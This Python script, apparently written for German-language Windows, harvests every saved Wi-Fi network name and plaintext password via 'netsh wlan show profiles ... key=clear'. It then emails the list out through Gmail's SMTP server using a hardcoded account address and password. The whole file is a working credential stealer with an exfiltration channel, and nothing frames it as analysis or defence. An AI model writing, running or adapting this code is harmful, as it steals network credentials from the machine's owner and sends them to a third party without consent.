import subprocess
import smtplib


def funk():
    a = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("cp850").split("\n")

    a = [i.split(":")[1][1:-1] for i in a if " Profil für alle Benutzer :" in i]
    hacks=[]

    for i in a:
        keys = subprocess.check_output(["netsh", "wlan", "show", "profiles",i,"key=clear"]).decode("cp850").split("\n")
        for key in keys:
            line = key.split('\n')
            if "SSID-Name" in str(line):
                name = str(line)
                name = name.split(":")
                name = name[1]
                name = name[1:-1]


            if "Schlüsselinhalt" in str(line):
                passwort = str(line)
                passwort = passwort.split(":")
                passwort = passwort[1]
                passwort = passwort[1:-1]
                hack = (name,passwort)
        hacks.append(hack)
    return hacks



def send_email(email, password, message):


    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, str(message))
    email_server.quit()


hacked = funk()

send_email("elmassecurapp@gmail.com","sinemonur28", hacked)